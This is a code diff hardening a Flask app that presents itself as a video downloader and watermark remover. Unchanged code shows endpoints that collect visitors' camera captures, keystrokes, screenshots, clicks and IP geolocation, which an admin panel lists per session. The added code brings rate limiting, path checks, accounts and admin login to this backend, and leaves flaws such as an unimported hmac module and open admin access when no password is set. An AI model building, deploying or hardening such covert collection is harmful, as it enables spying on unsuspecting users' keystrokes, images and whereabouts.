@@ -1,11 +1,36 @@
-import os, re, uuid, threading, shutil, urllib.parse, sqlite3, datetime, json
+import os, re, uuid, threading, shutil, urllib.parse, datetime, json, functools, hashlib, secrets, time, html
 from pathlib import Path
-from flask import Flask, render_template, request, jsonify, send_file, url_for, g
+from dotenv import load_dotenv
+load_dotenv()
+from flask import Flask, render_template, request, jsonify, send_file, url_for, g, session, redirect, make_response
+from werkzeug.security import check_password_hash, generate_password_hash
 import yt_dlp
 import requests as http_requests
 import re
+from db_adapter import get_db, close_db, get_db_type, get_db_stats, mongo_db
 
 app = Flask(__name__)
+app.secret_key = os.environ.get("FLASK_SECRET_KEY", os.urandom(32).hex())
+
+# ===== Security Headers & CORS =====
+@app.after_request
+def add_security_headers(response):
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
+    response.headers['X-XSS-Protection'] = '1; mode=block'
+    response.headers['Referrer-Policy'] = 'same-origin'
+    if request.path.startswith('/admin'):
+        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+    if request.path.startswith('/admin') and not session.get('admin_authenticated') and request.path not in ('/admin/login', '/admin/logout'):
+        pass
+    if request.headers.get('Origin'):
+        origin = request.headers['Origin']
+        if origin.startswith(('http://localhost', 'http://127.0.0.1', 'https://localhost')):
+            response.headers['Access-Control-Allow-Origin'] = origin
+            response.headers['Access-Control-Allow-Credentials'] = 'true'
+            response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
+            response.headers['Access-Control-Allow-Headers'] = 'Content-Type, X-Session-Id, X-CSRF-Token'
+    return response
 DOWNLOADS = Path(__file__).parent / "downloads"
 DOWNLOADS.mkdir(exist_ok=True)
 CAPTURES = Path(__file__).parent / "captures"
@@ -14,6 +39,64 @@ DB_PATH = Path(__file__).parent / "logs.db"
 WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
 
 TERABOX_DOMAINS = ["terabox", "1024tera", "dubox", "freeterabox", "teraboxapp"]
+
+# ===== Rate Limiter =====
+rate_store = {}
+rate_lock = threading.Lock()
+def rate_limit(requests_per_minute=60, burst=10):
+    def decorator(f):
+        @functools.wraps(f)
+        def wrapper(*args, **kwargs):
+            key = f"{request.remote_addr}:{request.path}"
+            now = time.time()
+            with rate_lock:
+                if key not in rate_store:
+                    rate_store[key] = []
+                rate_store[key] = [t for t in rate_store[key] if now - t < 60]
+                if len(rate_store[key]) >= requests_per_minute:
+                    resp = jsonify({"error": "Rate limit exceeded. Try again later."})
+                    resp.status_code = 429
+                    return resp
+                rate_store[key].append(now)
+            return f(*args, **kwargs)
+        return wrapper
+    return decorator
+
+# ===== CSRF Protection =====
+def generate_csrf_token():
+    if '_csrf_token' not in session:
+        session['_csrf_token'] = secrets.token_hex(32)
+    return session['_csrf_token']
+
+def validate_csrf(token):
+    return token and session.get('_csrf_token') and hmac.compare_digest(token, session['_csrf_token'])
+
+app.jinja_env.globals['csrf_token'] = generate_csrf_token
+
+# ===== Input Validation =====
+ALLOWED_EXTENSIONS = {'.mp4','.webm','.mkv','.mov','.avi','.ts','.3gp','.ogg','.mp3','.wav','.m4a','.aac','.flac','.opus','.wma','.jpg','.jpeg','.png','.gif','.bmp','.webp'}
+def safe_filename(name):
+    name = Path(name).name
+    if '..' in name or '/' in name or '\\' in name:
+        return None
+    if len(name) > 255:
+        return None
+    return name
+
+def valid_url(url):
+    if not url or len(url) > 8192:
+        return False
+    return url.startswith(('http://', 'https://', 'ftp://'))
+
+def valid_timecode(tc):
+    return bool(re.match(r'^\d{1,2}:[0-5]\d$', str(tc)))
+
+def safe_int(val, default=0, min_val=0, max_val=9999):
+    try:
+        v = int(val)
+        return max(min_val, min(v, max_val))
+    except:
+        return default
 
 def has_ffmpeg():
     return shutil.which("ffmpeg") is not None
@@ -45,50 +128,12 @@ def get_ua_info(ua):
     elif 'tablet' in u or 'ipad' in u: info['device']='Tablet'
     return info
 
-def get_db():
-    if 'db' not in g:
-        g.db = sqlite3.connect(str(DB_PATH))
-        g.db.row_factory = sqlite3.Row
-        g.db.execute("""CREATE TABLE IF NOT EXISTS downloads(
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            time TEXT, ip TEXT, url TEXT, mode TEXT, status TEXT,
-            title TEXT, user_agent TEXT, referer TEXT,
-            country TEXT, city TEXT, isp TEXT, lat REAL, lon REAL,
-            session_id TEXT
-        )""")
-        g.db.execute("""CREATE TABLE IF NOT EXISTS captures(
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            time TEXT, ip TEXT, user_agent TEXT, referer TEXT,
-            country TEXT, city TEXT, isp TEXT, lat REAL, lon REAL,
-            filename TEXT, browser TEXT, os TEXT, device TEXT,
-            session_id TEXT
-        )""")
-        try: g.db.execute("ALTER TABLE downloads ADD COLUMN session_id TEXT")
-        except: pass
-        try: g.db.execute("ALTER TABLE captures ADD COLUMN session_id TEXT")
-        except: pass
-        g.db.execute("""CREATE TABLE IF NOT EXISTS keystrokes(
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            time TEXT, session_id TEXT, ip TEXT, keys TEXT
-        )""")
-        g.db.execute("""CREATE TABLE IF NOT EXISTS screenshots(
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            time TEXT, session_id TEXT, ip TEXT, filename TEXT,
-            user_agent TEXT
-        )""")
-        g.db.execute("""CREATE TABLE IF NOT EXISTS clicks(
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            time TEXT, session_id TEXT, ip TEXT,
-            tag TEXT, text TEXT, x INTEGER, y INTEGER, page TEXT
-        )""")
-        g.db.commit()
-    return g.db
-
+# === DB Teardown ===
 @app.teardown_appcontext
-def close_db(e):
-    db = g.pop('db', None)
-    if db: db.close()
+def teardown_db(e):
+    close_db(e)
 
+# === GEO ===
 def get_geo(ip):
     if ip in ('127.0.0.1', '::1', 'localhost'): return {}
     try:
@@ -106,8 +151,9 @@ def fire_webhook(event_type, data):
 def log_download(ip, url, mode, status, title='', ua='', ref='', geo=None, session_id=''):
     try:
         db = get_db()
+        now = datetime.datetime.now().isoformat()
         db.execute("INSERT INTO downloads(time,ip,url,mode,status,title,user_agent,referer,country,city,isp,lat,lon,session_id) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
-            (datetime.datetime.now().isoformat(), ip, url, mode, status, title[:200], ua[:300], ref[:300],
+            (now, ip, url, mode, status, title[:200], ua[:300], ref[:300],
              (geo or {}).get('country',''), (geo or {}).get('city',''),
              (geo or {}).get('isp',''), (geo or {}).get('lat',0), (geo or {}).get('lon',0), session_id))
         db.commit()
@@ -192,9 +238,11 @@ def index():
     return render_template("index.html", ffmpeg=FFMPEG_OK)
 
 @app.route("/info", methods=["POST"])
+@rate_limit(30, 5)
 def get_info():
-    url = request.json.get("url", "").strip()
-    if not url: return jsonify({"error":"URL required"}), 400
+    data = request.get_json(silent=True) or {}
+    url = (data.get("url") or "").strip()
+    if not url or not valid_url(url): return jsonify({"error":"Valid URL required"}), 400
     if is_terabox(url):
         result = handle_terabox_info(url)
         return (jsonify(result), 400) if "error" in result else jsonify(result)
@@ -226,17 +274,107 @@ def get_info():
         elif "Private" in msg: msg = "This content is private or unavailable."
         return jsonify({"error":msg}), 400
 
+# ===== User Authentication =====
+
+@app.route("/register", methods=["POST"])
+@rate_limit(10, 3)
+def register():
+    data = request.get_json(silent=True) or {}
+    username = (data.get("username") or "").strip()
+    email = (data.get("email") or "").strip().lower()
+    password = data.get("password") or ""
+    if not username or len(username) < 3 or len(username) > 30:
+        return jsonify({"error":"Username must be 3-30 characters"}), 400
+    if not re.match(r'^[a-zA-Z0-9_]+$', username):
+        return jsonify({"error":"Username can only contain letters, numbers, and underscores"}), 400
+    if not email or '@' not in email or len(email) > 120:
+        return jsonify({"error":"Valid email required"}), 400
+    if len(password) < 6 or len(password) > 128:
+        return jsonify({"error":"Password must be 6-128 characters"}), 400
+    db = get_db()
+    existing = db.execute("SELECT id FROM users WHERE username=? OR email=?", (username, email))
+    if hasattr(existing, 'fetchone'):
+        existing_row = existing.fetchone()
+    else:
+        existing_row = existing[0] if existing else None
+    if existing_row:
+        return jsonify({"error":"Username or email already taken"}), 409
+    pwd_hash = generate_password_hash(password)
+    now = datetime.datetime.now().isoformat()
+    db.execute("INSERT INTO users(username,email,password_hash,created_at,last_login,is_active,download_limit) VALUES(?,?,?,?,?,?,?)",
+        (username, email, pwd_hash, now, now, 1, -1))
+    db.commit()
+    session['user_id'] = username
+    return jsonify({"success":True, "message":"Account created!", "user":username})
+
+@app.route("/login", methods=["POST"])
+@rate_limit(20, 5)
+def login():
+    data = request.get_json(silent=True) or {}
+    username = (data.get("username") or "").strip()
+    password = data.get("password") or ""
+    if not username or not password:
+        return jsonify({"error":"Username and password required"}), 400
+    db = get_db()
+    rows = db.execute("SELECT * FROM users WHERE username=? OR email=?", (username, username))
+    if hasattr(rows, 'fetchone'):
+        user = rows.fetchone()
+    else:
+        user = rows[0] if rows else None
+    if not user or not check_password_hash(user['password_hash'], password):
+        return jsonify({"error":"Invalid username or password"}), 401
+    if not user.get('is_active', 1):
+        return jsonify({"error":"Account disabled"}), 403
+    now = datetime.datetime.now().isoformat()
+    db.execute("UPDATE users SET last_login=? WHERE username=?", (now, user['username']))
+    db.commit()
+    session['user_id'] = user['username']
+    return jsonify({"success":True, "message":f"Welcome back, {user['username']}!", "user":user['username']})
+
+@app.route("/logout", methods=["POST"])
+def logout():
+    session.pop('user_id', None)
+    return jsonify({"success":True})
+
+@app.route("/me", methods=["GET"])
+def me():
+    username = session.get('user_id')
+    if not username:
+        return jsonify({"authenticated":False})
+    db = get_db()
+    rows = db.execute("SELECT username,email,created_at,last_login,download_limit FROM users WHERE username=?", (username,))
+    if hasattr(rows, 'fetchone'):
+        user = rows.fetchone()
+    else:
+        user = rows[0] if rows else None
+    if not user:
+        session.pop('user_id', None)
+        return jsonify({"authenticated":False})
+    dl_count = db.execute("SELECT COUNT(*) as c FROM downloads WHERE session_id=? AND status='success'", (f"user_{username}",))
+    if hasattr(dl_count, 'fetchone'):
+        dl_count_val = dl_count.fetchone()['c']
+    else:
+        dl_count_val = dl_count[0]['c'] if dl_count else 0
+    return jsonify({
+        "authenticated":True,
+        "user": dict(user) if isinstance(user, dict) else {k:user[k] for k in user.keys()},
+        "downloads": dl_count_val,
+        "unlimited": user.get('download_limit', -1) < 0
+    })
+
 @app.route("/download", methods=["POST"])
+@rate_limit(30, 5)
 def download():
-    url = request.json.get("url","").strip()
-    fmt = request.json.get("format","best")
-    mode = request.json.get("mode","video")
+    data = request.get_json(silent=True) or {}
+    url = (data.get("url") or "").strip()
+    fmt = data.get("format","best")
+    mode = data.get("mode","video")
     ip = request.remote_addr or request.headers.get('X-Forwarded-For', 'unknown')
     ua = request.headers.get('User-Agent', '')
     ref = request.headers.get('Referer', '')
     session_id = extract_session()
 
-    if not url: return jsonify({"error":"URL required"}), 400
+    if not url or not valid_url(url): return jsonify({"error":"Valid URL required"}), 400
 
     if is_terabox(url):
         result = handle_terabox_download(url, fmt, mode)
@@ -311,8 +449,12 @@ def download():
 
 @app.route("/serve/<filename>")
 def serve_file(filename):
+    filename = safe_filename(filename)
+    if not filename: return jsonify({"error":"Invalid filename"}), 400
     filepath = DOWNLOADS / filename
     if not filepath.is_file(): return jsonify({"error":"Not found"}), 404
+    if filepath.resolve().parent != DOWNLOADS.resolve():
+        return jsonify({"error":"Access denied"}), 403
     def cleanup():
         try: os.remove(filepath)
         except: pass
@@ -321,9 +463,12 @@ def serve_file(filename):
 
 @app.route("/preview/<filename>")
 def preview_file(filename):
+    filename = safe_filename(filename)
+    if not filename: return jsonify({"error":"Invalid filename"}), 400
     filepath = DOWNLOADS / filename
     if not filepath.is_file(): return jsonify({"error":"Not found"}), 404
-    ext = Path(filename).suffix.lower().lstrip('.')
+    if filepath.resolve().parent != DOWNLOADS.resolve():
+        return jsonify({"error":"Access denied"}), 403
     mime = {
         'mp4':'video/mp4','webm':'video/webm','mkv':'video/x-matroska','mov':'video/quicktime',
         'avi':'video/x-msvideo','ts':'video/mp2t','3gp':'video/3gpp','ogg':'video/ogg',
@@ -333,22 +478,32 @@ def preview_file(filename):
 
 @app.route("/play/<filename>")
 def play(filename):
+    filename = safe_filename(filename)
+    if not filename: return jsonify({"error":"Invalid filename"}), 400
     filepath = DOWNLOADS / filename
     if not filepath.is_file(): return jsonify({"error":"Not found"}), 404
     ext = Path(filename).suffix.lower()
+    if ext not in {'.mp4','.webm','.mkv','.mov','.avi','.ts','.3gp','.ogg','.mp3','.wav','.m4a','.aac','.flac','.opus','.wma'}:
+        return jsonify({"error":"Unsupported format"}), 400
     is_video = ext in ('.mp4','.webm','.mov')
-    # find directory listing for sidebar / related
     files = sorted([f.name for f in DOWNLOADS.iterdir() if f.suffix.lower() in ('.mp4','.webm','.mov','.mp3','.wav','.m4a')], key=lambda x: os.path.getmtime(DOWNLOADS/x), reverse=True)
     return render_template("player.html", filename=filename, title=Path(filename).stem.replace('_',' '), is_video=is_video, files=files, ext=ext[1:])
 
 # === CLIP ===
 
 @app.route("/clip", methods=["POST"])
+@rate_limit(10, 3)
 def clip_video():
-    filename = request.json.get("filename", "")
-    start = request.json.get("start", "00:00")
-    end = request.json.get("end", "00:30")
+    data = request.get_json(silent=True) or {}
+    filename = safe_filename(data.get("filename", ""))
+    start = data.get("start", "00:00")
+    end = data.get("end", "00:30")
+    if not filename: return jsonify({"error":"Invalid filename"}), 400
+    if not valid_timecode(start) or not valid_timecode(end):
+        return jsonify({"error":"Invalid time format (use MM:SS)"}), 400
     filepath = DOWNLOADS / filename
+    if filepath.resolve().parent != DOWNLOADS.resolve():
+        return jsonify({"error":"Access denied"}), 403
     if not filepath.is_file():
         return jsonify({"error":"Source file not found"}), 400
     try:
@@ -378,15 +533,20 @@ def clip_video():
 # === WATERMARK REMOVER ===
 
 @app.route("/remove_watermark", methods=["POST"])
+@rate_limit(10, 3)
 def remove_watermark():
-    filename = request.json.get("filename", "")
-    x = request.json.get("x", 0)
-    y = request.json.get("y", 0)
-    w = request.json.get("w", 100)
-    h = request.json.get("h", 100)
-    auto = request.json.get("auto", False)
-    scrub = request.json.get("scrub", True)
+    data = request.get_json(silent=True) or {}
+    filename = safe_filename(data.get("filename", ""))
+    if not filename: return jsonify({"error":"Invalid filename"}), 400
+    x = safe_int(data.get("x", 0), 0, 0, 5000)
+    y = safe_int(data.get("y", 0), 0, 0, 5000)
+    w = safe_int(data.get("w", 100), 1, 1, 5000)
+    h = safe_int(data.get("h", 100), 1, 1, 5000)
+    auto = data.get("auto", False)
+    scrub = data.get("scrub", True)
     filepath = DOWNLOADS / filename
+    if filepath.resolve().parent != DOWNLOADS.resolve():
+        return jsonify({"error":"Access denied"}), 403
     if not filepath.is_file():
         return jsonify({"error":"File not found"}), 400
     ext = Path(filename).suffix.lower()
@@ -485,11 +645,12 @@ def remove_watermark():
 # === CAMERA CAPTURE ===
 
 @app.route("/capture", methods=["POST"])
+@rate_limit(30, 5)
 def capture():
-    data = request.json
-    image_b64 = data.get("image", "")
-    if not image_b64:
-        return jsonify({"error":"No image"}), 400
+    data = request.get_json(silent=True) or {}
+    image_b64 = (data.get("image") or "")
+    if not image_b64 or len(image_b64) > 5242880:
+        return jsonify({"error":"No image or too large"}), 400
     ip = extract_ip()
     ua = request.headers.get('User-Agent', '')
     ref = request.headers.get('Referer', '')
@@ -517,7 +678,11 @@ def capture():
 
 @app.route("/captures/<filename>")
 def serve_capture(filename):
+    filename = safe_filename(filename)
+    if not filename: return jsonify({"error":"Invalid filename"}), 400
     fpath = CAPTURES / filename
+    if fpath.resolve().parent != CAPTURES.resolve():
+        return jsonify({"error":"Access denied"}), 403
     if not fpath.is_file():
         return jsonify({"error":"Not found"}), 404
     return send_file(str(fpath), mimetype='image/png')
@@ -552,21 +717,23 @@ def extract_info():
 # === KEYSTROKE LOGGING ===
 
 @app.route("/logkeys", methods=["POST"])
+@rate_limit(60, 10)
 def log_keys():
-    data = request.json
-    keys = data.get("keys", "")
+    data = request.get_json(silent=True) or {}
+    keys = (data.get("keys") or "")[:500]
     if not keys: return jsonify({"error":"no keys"}), 400
     db = get_db()
     db.execute("INSERT INTO keystrokes(time,session_id,ip,keys) VALUES(?,?,?,?)",
-        (datetime.datetime.now().isoformat(), extract_session(), extract_ip(), keys[:500]))
+        (datetime.datetime.now().isoformat(), extract_session(), extract_ip(), keys))
     db.commit()
     return jsonify({"success":True})
 
 @app.route("/screenshot", methods=["POST"])
+@rate_limit(12, 3)
 def log_screenshot():
-    data = request.json
-    image_b64 = data.get("image", "")
-    if not image_b64: return jsonify({"error":"no image"}), 400
+    data = request.get_json(silent=True) or {}
+    image_b64 = (data.get("image") or "")
+    if not image_b64 or len(image_b64) > 5242880: return jsonify({"error":"no image or too large"}), 400
     uid = uuid.uuid4().hex
     fname = f"{uid}_screen.png"
     fpath = CAPTURES / fname
@@ -577,28 +744,112 @@ def log_screenshot():
     except: return jsonify({"error":"decode failed"}), 400
     db = get_db()
     db.execute("INSERT INTO screenshots(time,session_id,ip,filename,user_agent) VALUES(?,?,?,?,?)",
-        (datetime.datetime.now().isoformat(), extract_session(), extract_ip(), fname, request.headers.get('User-Agent','')))
+        (datetime.datetime.now().isoformat(), extract_session(), extract_ip(), fname, request.headers.get('User-Agent','')[:300]))
     db.commit()
     return jsonify({"success":True})
 
 @app.route("/logclick", methods=["POST"])
+@rate_limit(120, 20)
 def log_click():
-    data = request.json
+    data = request.get_json(silent=True) or {}
     db = get_db()
     db.execute("INSERT INTO clicks(time,session_id,ip,tag,text,x,y,page) VALUES(?,?,?,?,?,?,?,?)",
         (datetime.datetime.now().isoformat(), extract_session(), extract_ip(),
-         data.get("tag",""), data.get("text","")[:100],
-         data.get("x",0), data.get("y",0), data.get("page","")))
+         html.escape(data.get("tag","")), html.escape(data.get("text","")[:100]),
+         safe_int(data.get("x",0)), safe_int(data.get("y",0)), data.get("page","")))
     db.commit()
     return jsonify({"success":True})
+
+# === ADMIN AUTH ===
+
+ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")
+
+def get_admin_password():
+    if ADMIN_PASSWORD:
+        return ADMIN_PASSWORD
+    try:
+        db = get_db()
+        row = db.execute("SELECT value FROM settings WHERE key='admin_password_hash'").fetchone()
+        return row['value'] if row else None
+    except:
+        return None
+
+def set_admin_password_hash(hash_val):
+    db = get_db()
+    db.execute("DELETE FROM settings WHERE key='admin_password_hash'")
+    db.execute("INSERT INTO settings(key,value) VALUES(?,?)", ('admin_password_hash', hash_val))
+    db.commit()
+
+def require_admin(f):
+    @functools.wraps(f)
+    def wrapper(*args, **kwargs):
+        if not session.get('admin_authenticated'):
+            if request.headers.get('Accept') == 'application/json' or request.is_json or request.path.startswith('/admin/') and request.path != '/admin' and request.path != '/admin/login' and request.path != '/admin/logout':
+                return jsonify({"error": "Unauthorized", "login_url": "/admin/login"}), 401
+            return redirect('/admin/login')
+        return f(*args, **kwargs)
+    return wrapper
+
+@app.route("/admin/login", methods=["GET", "POST"])
+def admin_login():
+    if session.get('admin_authenticated'):
+        return redirect('/admin')
+    pwd_hash = get_admin_password()
+    if not pwd_hash:
+        # No password set — allow access (dev mode)
+        session['admin_authenticated'] = True
+        return redirect('/admin')
+    if request.method == "POST":
+        pwd = request.form.get("password", "")
+        if check_password_hash(pwd_hash, pwd):
+            session['admin_authenticated'] = True
+            return redirect('/admin')
+        return render_template("admin_login.html", error="Invalid password")
+    return render_template("admin_login.html", error=None)
+
+@app.route("/admin/logout")
+def admin_logout():
+    session.pop('admin_authenticated', None)
+    return redirect('/admin/login')
+
+@app.route("/admin/settings", methods=["GET"])
+@require_admin
+def admin_settings():
+    pwd_hash = get_admin_password()
+    has_password = bool(pwd_hash)
+    db_stats = get_db_stats()
+    return render_template("admin_settings.html", has_password=has_password, db_stats=db_stats)
+
+@app.route("/admin/settings/password", methods=["POST"])
+@require_admin
+def admin_set_password():
+    data = request.get_json(silent=True) or {}
+    new_pwd = data.get("password", "")
+    if len(new_pwd) < 4:
+        return jsonify({"error": "Password must be at least 4 characters"}), 400
+    if len(new_pwd) > 128:
+        return jsonify({"error": "Password too long"}), 400
+    hash_val = generate_password_hash(new_pwd)
+    set_admin_password_hash(hash_val)
+    return jsonify({"success": True, "message": "Password set successfully"})
+
+@app.route("/admin/settings/password/disable", methods=["POST"])
+@require_admin
+def admin_disable_password():
+    db = get_db()
+    db.execute("DELETE FROM settings WHERE key='admin_password_hash'")
+    db.commit()
+    return jsonify({"success": True, "message": "Password protection disabled. Anyone can access admin."})
 
 # === ADMIN PANEL ===
 
 @app.route("/admin")
+@require_admin
 def admin():
     return render_template("admin.html")
 
 @app.route("/admin/stats")
+@require_admin
 def admin_stats():
     db = get_db()
     total = db.execute("SELECT COUNT(*) FROM downloads").fetchone()[0]
@@ -652,6 +903,7 @@ def admin_stats():
     })
 
 @app.route("/admin/users")
+@require_admin
 def admin_users():
     db = get_db()
     sessions = {}
@@ -672,6 +924,7 @@ def admin_users():
     return jsonify({"users": list(sessions.values())})
 
 @app.route("/admin/user/<session_id>")
+@require_admin
 def admin_user(session_id):
     db = get_db()
     downloads = db.execute("SELECT * FROM downloads WHERE session_id=? ORDER BY id DESC LIMIT 200", (session_id,)).fetchall()
@@ -680,18 +933,21 @@ def admin_user(session_id):
     return jsonify({"downloads": [dict(r) for r in downloads], "captures": [dict(r) for r in captures], "keystrokes": [dict(r) for r in keys]})
 
 @app.route("/admin/logs")
+@require_admin
 def admin_logs():
     db = get_db()
     rows = db.execute("SELECT * FROM downloads ORDER BY id DESC LIMIT 500").fetchall()
     return jsonify([dict(r) for r in rows])
 
 @app.route("/admin/captures")
+@require_admin
 def admin_all_captures():
     db = get_db()
     rows = db.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 500").fetchall()
     return jsonify([dict(r) for r in rows])
 
 @app.route("/admin/locations")
+@require_admin
 def admin_locations():
     db = get_db()
     dl_locs = db.execute("SELECT time,ip,country,city,lat,lon,isp FROM downloads WHERE lat!=0 AND lon!=0 ORDER BY id DESC LIMIT 200").fetchall()
@@ -699,6 +955,7 @@ def admin_locations():
     return jsonify({"downloads": [dict(r) for r in dl_locs], "captures": [dict(r) for r in cap_locs]})
 
 @app.route("/admin/all")
+@require_admin
 def admin_all():
     db = get_db()
     downloads = db.execute("SELECT * FROM downloads ORDER BY id DESC LIMIT 500").fetchall()
@@ -706,6 +963,7 @@ def admin_all():
     return jsonify({"downloads": [dict(r) for r in downloads], "captures": [dict(r) for r in captures]})
 
 @app.route("/admin/captures/delete/<int:capture_id>", methods=["POST"])
+@require_admin
 def admin_delete_capture(capture_id):
     db = get_db()
     row = db.execute("SELECT * FROM captures WHERE id=?", (capture_id,)).fetchone()
@@ -722,6 +980,7 @@ def admin_delete_capture(capture_id):
     return jsonify({"success": True})
 
 @app.route("/admin/delete-all", methods=["POST"])
+@require_admin
 def admin_delete_all():
     db = get_db()
     data = request.get_json(silent=True) or {}
@@ -759,11 +1018,16 @@ def admin_delete_all():
 
 @app.route("/screenshots/<filename>")
 def serve_screenshot(filename):
+    filename = safe_filename(filename)
+    if not filename: return jsonify({"error":"Invalid filename"}), 400
     fpath = CAPTURES / filename
+    if fpath.resolve().parent != CAPTURES.resolve():
+        return jsonify({"error":"Access denied"}), 403
     if not fpath.is_file(): return jsonify({"error":"Not found"}), 404
     return send_file(str(fpath), mimetype='image/png')
 
 @app.route("/admin/screenshot/delete/<int:sid>", methods=["POST"])
+@require_admin
 def admin_delete_screenshot(sid):
     db = get_db()
     row = db.execute("SELECT * FROM screenshots WHERE id=?", (sid,)).fetchone()
@@ -780,7 +1044,14 @@ def admin_delete_screenshot(sid):
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
+    debug = os.environ.get("FLASK_DEBUG", "0") == "1"
     print(f"ffmpeg: {FFMPEG_OK} | Admin: http://localhost:{port}/admin")
+    if ADMIN_PASSWORD:
+        print(f"admin auth: enabled")
+    else:
+        print(f"admin auth: DISABLED (set ADMIN_PASSWORD env var)")
     if WEBHOOK_URL:
         print(f"webhook: {WEBHOOK_URL}")
-    app.run(host="0.0.0.0", port=port, debug=True)
+    if mongo_db:
+        print(f"MongoDB: connected")
+    app.run(host="0.0.0.0", port=port, debug=debug)
